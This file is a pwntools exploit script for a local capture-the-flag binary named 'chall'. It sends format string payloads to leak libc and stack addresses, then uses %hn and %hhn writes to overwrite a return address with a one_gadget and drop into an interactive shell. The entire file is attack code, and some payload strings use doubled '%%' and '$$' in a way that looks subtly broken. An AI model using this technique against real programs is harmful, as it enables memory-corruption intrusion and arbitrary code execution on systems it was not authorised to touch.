from pwn import *

p = process('./chall')
e = ELF('./chall')
libc = e.libc 

p.sendlineafter(b'name: ', b'huy')

payload = b'yes' + b'%%9$$p%%11$$p'

p.sendlineafter(b'me?\n', payload)
p.recvuntil(b'yes')

leak = p.recvline()[:-1].decode().split('0x')
libc.address = int(leak[1], 16) - libc.symbols['__libc_start_main'] - 240
stack_address = int(leak[2], 16) - 0x1f * 8 
ret_stack_frame = stack_address + 3 * 8

log.info(f'leak libc address:0x{libc.address:0x}')
log.info(f'stack address: 0x{stack_address:0x}')
log.info(f'return stack frame: 0x{ret_stack_frame:0x}')


payload = b'yes' + '%%{}x%%{}$$hn'.format((ret_stack_frame & 0xffff) - 3, 11).encode()
print(payload)
p.sendlineafter(b'me?\n', payload)
p.recvuntil(b'yes')

payload = b'yes' + '%%{}x%%{}$$hhn'.format(((libc.symbols['__libc_start_main'] + 195) & 0xff) - 3, 37).encode()
print(payload)
p.sendlineafter(b'me?\n', payload)


p.sendlineafter(b'name: ', b'huy')

one_gadget = libc.address + 0xd5bf7
payload = b'yes' + '%%{}x%%{}$$hn'.format((one_gadget & 0xffff) - 3, 37).encode()
print(payload)
p.sendlineafter(b'me?\n', payload)

payload = b'yes' + '%%{}x%%{}$$hn'.format(((ret_stack_frame & 0xffff) + 2) - 3, 11).encode()
print(payload)
p.sendlineafter(b'me?\n', payload)

one_gadget = one_gadget >> 16
payload = b'yes' + '%%{}x%%{}$$hn'.format((one_gadget & 0xffff) - 3, 37).encode()
print(payload)
p.sendlineafter(b'me?\n', payload)

p.interactive()